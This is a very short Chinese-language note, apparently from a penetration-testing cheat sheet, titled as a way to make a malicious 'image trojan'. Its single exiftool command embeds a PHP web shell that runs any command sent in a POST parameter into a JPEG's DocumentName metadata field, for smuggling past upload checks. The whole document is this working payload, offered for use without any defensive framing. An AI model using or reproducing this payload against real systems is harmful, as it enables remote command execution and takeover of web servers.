# 通过exiftool 在其中创建恶意图像马

### 
```
exiftool poc.jpg -documentname="<?php echo exec(\$_POST['cmd']); ?>"
```